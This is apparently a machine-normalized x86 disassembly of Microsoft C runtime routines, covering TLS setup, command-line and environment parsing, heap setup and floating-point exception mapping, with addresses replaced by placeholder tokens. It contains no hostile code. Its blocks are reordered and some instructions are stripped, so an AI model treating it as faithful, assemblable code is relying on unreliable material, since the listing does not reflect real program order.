[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ec70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ec70 ]
sub_1002ecc5
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1002ed1c
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_1002ed1c
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_1002ecc5
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1002edfb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1002edab
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1002ee72
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_1002ab4b
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1002eeed
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_1002ab4b
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_1002ef68
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_1002eeed
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1002ef9c
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10027a85
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1002efd9
push 0xc
push r--data
call sub_1002fdfc
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_1002ab4b
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f0ae
push 0xc
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_1002c479
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f0b7
call sub_1002fe41
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1002f0c0
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1002ef68
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_10027a85
pop ecx
xor esi esi
push 0x0
push esi
call sub_1002efd9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1002f153
push 0x8
push r--data
call sub_1002fdfc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002fe41
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10027a85
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10027a85
pop ecx
push 0xd
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10027a85
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f26d
push 0xc
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f279
push esi
call sub_10027a85
pop ecx
push edi
call sub_1002c508
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10027a85
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1002c330
pop ecx
sub_1002f282
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_1002f153
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1002f2f0
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_1002ab4b
pop ecx
call sub_1002ef9c
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1002ef5f
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1002ae26
push [ rw-data ]
call sub_1002ee72
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002ee72
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002ee72
push [ rw-data ]
mov [ rw-data ] eax
call sub_1002ee72
add esp 0x10
mov [ rw-data ] eax
call sub_10030082
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_1002f153
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1002efd9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1002f47d
push 0x54
push r--data
call sub_1002fdfc
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_1002ddf5
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_1002ddf5
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_1002fe41
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10034ae2
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10034ae2
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1002f6d1
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_10027a85
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_1002f71f
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_100345cf
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1002ddf5
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10027160
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_10027160
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_10027a85
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1002ddf5
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10027a85
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
sub_1002f7fd
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_100389ba
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_100389ba
pop ecx
test eax eax
je r-xdata
call sub_100389ba
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1002f997
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_100345cf
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1002f7fd
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1002ddb0
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1002f7fd
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1002fa52
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_1002ddb0
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_1002ddb0
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_1002a0f0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10027a85
pop ecx
mov [ ebp - 0x4 ] ebx
sub_1002fb89
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002fbaf
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002fbd5
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_1002fc05
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_1002fc79
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1002f0c0
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_1002fdd9
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1002fc79
pop ecx
pop ecx
pop ebp
retn
sub_1002fdfc
push sub_1002fe60
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
